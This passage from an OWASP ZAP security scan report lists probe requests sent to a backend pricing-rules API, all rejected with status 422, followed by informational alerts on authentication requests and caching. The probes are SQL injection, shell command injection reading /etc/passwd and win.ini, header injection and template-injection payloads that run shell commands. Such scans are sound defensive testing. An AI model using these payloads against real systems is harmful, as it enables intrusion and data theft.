* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' AND '1'='2' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' OR '1'='1' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'&cat /etc/passwd&'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'(")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe';cat /etc/passwd;'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe';get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;cat /etc/passwd;")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;get-help #")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\";get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("Set-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("URL='http://1893954760473071002.owasp.org'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"+response.write(802,251*578,325)+\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("]]>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\r\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\r\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0\r\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\r\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\r\nSet-cookie: Tamper=7bc405bc-0e96-415c-9d9e-2794dd4ddfc0\r\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("cat /etc/passwd")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://\\1893954760473071002.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com:80/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://1893954760473071002%2eowasp%2eorg")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://1893954760473071002.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://1893954760473071002.owasp.org/?John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://\\1893954760473071002.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("response.write(802,251*578,325)")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("system-property('xsl:vendor')/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("vmVTLycuOgSqbeGEDlsJJnpUFQWfJJhreExfLLxXSWKkLBeJaZpnHgZBYTPfIbfenoOWZroZusGcFsACIvusFoBSkqNCkQRnhoKIvRPcJWEZetsudZByySLVyVFUdDbmkwcMcuZvHFKPVdntaDCRwIdxmTbUliCwFtEJYoGPwQosdUvPeOjkQjgkoUHgtHJOMqAADoCcPnxggrufOWWvxIqeGnMZHMrBqmlsUFeGepFCiFAmNsFfnSmdCgUqLFnafRJGUKwOlrDCnboOnTYerRRJeEyXDhhjhOabISqFYDEuQfcJZTCgihNhmDJuFRwyAKNhfhngGWskGeOsxEItEFMvJBUZEmmFpLZMCDMinfHrLtYJDVMQPdhjcnnHOcakVbwbOZYkuffDqUVBKKcIhwZOMVBWCryGynPbNbwSYUAIcikpeBqRNyQCwWJhSLRtdpXHPwceCKjwMJGineDTrPlkQCnjNPhdtqkdgoGKPxyAdshYcanMgcXLjpCduBo)`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com:80/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com:80/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj 1866*9707 zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj#set($x=3641*5004)${x}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj#{2415*6059}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj${3059*4944}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj<%=2533*5092%>zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj<p th:text=\"${7265*5240}\"></p>zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{#4414*2253}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{5179*9336}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{@3535*2250}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{@math key=\"9087\" method=\"multiply\" operand=\"9140\"/}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{5259*5645}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{60270|add:87920}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{=2803*2760}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{print \"8182\" \"9319\"}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{system(\"sleep 15\")}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules/
  * Node Name: `http://backend:8000/pricing/rules/ ()("John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``


Instances: 294

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Authentication Request Identified ](https://www.zaproxy.org/docs/alerts/10111/)



##### Informational (High)

### Description

The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.

* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/ ()({username,password,role})`
  * Method: `POST`
  * Parameter: `username`
  * Attack: ``
  * Evidence: `password`
  * Other Info: `userParam=username
userValue=John Doe
passwordParam=password`
* URL: http://backend:8000/auth/login
  * Node Name: `http://backend:8000/auth/login ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: ``
  * Evidence: `password`
  * Other Info: `userParam=username
userValue=username
passwordParam=password`


Instances: 2

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/ ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/)



#### Source ID: 3

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `DELETE `
  * Other Info: ``
* URL: http://backend:8000/
  * Node Name: `http://backend:8000/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/calls/call_sid
  * Node Name: `http://backend:8000/calls/call_sid`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status%3Fstatus=new
  * Node Name: `http://backend:8000/leads/10/status (status)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `PATCH `
  * Other Info: ``

Instances: Systemic


### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3


